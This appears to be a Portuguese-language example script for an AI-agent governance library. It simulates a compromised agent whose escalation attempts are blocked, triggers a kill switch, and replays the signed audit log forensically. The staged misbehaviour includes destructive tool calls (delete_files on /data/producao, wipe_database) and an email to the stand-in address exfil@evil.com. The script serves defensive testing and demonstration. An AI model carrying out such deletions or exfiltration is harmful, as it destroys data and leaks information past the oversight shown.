"""
EXEMPLO 06 — Análise Forense de Incidente
==========================================

Simula um incidente (agente tenta escalada de privilégio) e depois usa
o IncidentReplayer para reconstruir exatamente o que aconteceu.

Execute: python -m examples.06_forensics
"""

from examples._shared.setup import build_runtime, make_identity, print_header
from governance.forensics.replayer import IncidentReplayer
from governance.identity.models import AgentEnvironment, AgentScope


def run() -> None:
    print_header("EXEMPLO 06 — Análise Forense de Incidente")
    print("""
  Cenário: Agente comprometido tenta acessar ferramentas destrutivas.
  Após contenção (kill switch), reconstruímos o que aconteceu usando
  o IncidentReplayer sobre o audit log assinado.
""")

    runtime, audit, approval, _, _ = build_runtime(audit_subdir="06_forensics")
    agent = make_identity(
        agent_id="compromised-agent-v1",
        name="CompromisedAgent",
        owner="charlie@empresa.com",
        scopes=[AgentScope.READ_FILES, AgentScope.READ_DATABASE],
        environment=AgentEnvironment.DEV,
    )

    print_header("FASE 1 — Atividade Legítima (antes do comprometimento)")
    for path in ["/data/report.csv", "/data/config.json"]:
        runtime.execute(agent, "read_files", {"path": path})
        print(f"  ✓ read_files: {path}")

    print_header("FASE 2 — Atividade Suspeita (tentativas de escalada)")
    for _ in range(3):
        r = runtime.execute(agent, "delete_files", {"path": "/data/producao"})
        print(f"  ✗ delete_files → {r.error[:60]}")

    r = runtime.execute(agent, "wipe_database", {"confirm": "yes"})
    print(f"  ✗ wipe_database → {r.error[:60]}")

    r = runtime.execute(agent, "send_email", {"to": "exfil@evil.com"})
    print(f"  ✗ send_email → {r.error[:60]}")

    print_header("FASE 3 — Contenção (kill switch ativado)")
    approval.activate_kill_switch("Agente comprometido — P0 incident")
    r = runtime.execute(agent, "read_files", {"path": "/secrets"})
    print(f"  🚨 Kill switch bloqueou: {r.error[:60]}")
    approval.deactivate_kill_switch()

    print_header("FASE 4 — Reconstituição Forense")
    replayer = IncidentReplayer(audit._log_path)

    ok, msg = replayer.verify_integrity()
    print(f"\n  {'✓' if ok else '✗'} Integridade do log: {msg}")

    timeline = replayer.replay(agent_ids=[agent.id])
    print()
    print(timeline.render_timeline())

    print_header("FASE 5 — Resumo de Atividade do Agente")
    summary = replayer.agent_activity_summary(agent.id)
    print(f"\n  agent_id        : {summary['agent_id']}")
    print(f"  total_eventos   : {summary['total_events']}")
    print(f"  executadas      : {summary['executed']}")
    print(f"  negadas         : {summary['denied']}")
    print(f"  taxa de negação : {summary['deny_rate']:.0%}")
    print(f"  ferramentas OK  : {summary['tools_executed']}")
    print(f"  ferramentas KO  : {summary['tools_denied']}")


if __name__ == "__main__":
    run()
